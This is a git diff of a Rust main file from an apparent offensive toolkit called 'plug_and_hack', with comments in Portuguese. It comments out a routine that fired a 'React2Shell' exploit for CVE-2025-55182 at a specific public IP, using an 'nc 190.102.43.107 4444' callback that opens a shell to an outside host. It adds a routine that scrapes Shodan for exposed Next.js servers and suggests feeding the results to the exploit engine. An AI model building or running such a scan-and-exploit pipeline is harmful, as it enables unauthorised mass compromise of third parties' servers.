@@ -100,7 +100,7 @@ use plug_and_hack::providers::shodan::ShodanProvider;
 use plug_and_hack::providers::shodan::ShodanQuery;
 
 use plug_and_hack::pipeline::{Collector, Correlator, Modeler, Executor};
-
+use plug_and_hack::providers::shodan_spider::{ShodanSpiderProvider, ShodanSpiderQuery};
 // #[tokio::main]
 // async fn main() -> Result<(), ()> {
 //     let shodan = ShodanProvider::new("SUA_KEY".to_string());
@@ -141,26 +141,26 @@ use plug_and_hack::pipeline::{Collector, Correlator, Modeler, Executor};
 //     Ok(())
 // }
 
-#[tokio::main]
-async fn main() -> Result<(), ()> {
-    let target = Target {
-        ip: "103.87.66.230".to_string(),
-        port: 3100,
-        service: Some("react-server".to_string()),
-        os: None,
-        domains: vec![],
-        vulns: vec!["CVE-2025-55182".to_string()],
-        raw_data: None,
-    };
-
-    let command = "nc 190.102.43.107 4444".to_string();
-    let engine = React2ShellEngine::new(command, 1);
-
-    engine.exploit(&target).await.expect("ERR"); // ✅ agora funciona
-
-    println!("[+] Exploit concluído para {}:{}", target.ip, target.port);
-    Ok(())
-}
+// #[tokio::main]
+// async fn main() -> Result<(), ()> {
+//     let target = Target {
+//         ip: "103.87.66.230".to_string(),
+//         port: 3100,
+//         service: Some("react-server".to_string()),
+//         os: None,
+//         domains: vec![],
+//         vulns: vec!["CVE-2025-55182".to_string()],
+//         raw_data: None,
+//     };
+//
+//     let command = "nc 190.102.43.107 4444".to_string();
+//     let engine = React2ShellEngine::new(command, 1);
+//
+//     engine.exploit(&target).await.expect("ERR"); // ✅ agora funciona
+//
+//     println!("[+] Exploit concluído para {}:{}", target.ip, target.port);
+//     Ok(())
+// }
 
 // use plug_and_hack::core::exploit_engine::ExploitEngine;
 // use plug_and_hack::engines::custom::React2ShellEngine;
@@ -231,3 +231,33 @@ async fn main() -> Result<(), ()> {
 //     println!("[+] Exploração concluída.");
 //     Ok(())
 // }
+
+// src/main.rs
+
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    // 1. Inicializa o spider (não precisa de API key)
+    let spider = ShodanSpiderProvider::new();
+
+    // 2. Define a query:
+    //    Opção A: query livre
+    let query = ShodanSpiderQuery::new("http.component:\"Next.js\"");
+
+    //    Opção B: por CVE (simula "vuln:CVE-2025-55182")
+    // let query = ShodanSpiderQuery::from_cve("CVE-2025-55182");
+
+    // 3. Executa a busca
+    println!("[*] Pesquisando no Shodan (web scraping)...");
+    let targets = spider.search(query).await?;
+
+    // 4. Exibe resultados
+    println!("[+] Encontrados {} IPs públicos:", targets.len());
+    for t in &targets {
+        println!("  → {}:{}", t.ip, t.port);
+    }
+
+    // 5. (Opcional) Agora você pode passar `targets` para um exploit engine
+    //    Ex: React2ShellEngine::exploit_many(&targets).await?;
+
+    Ok(())
+}
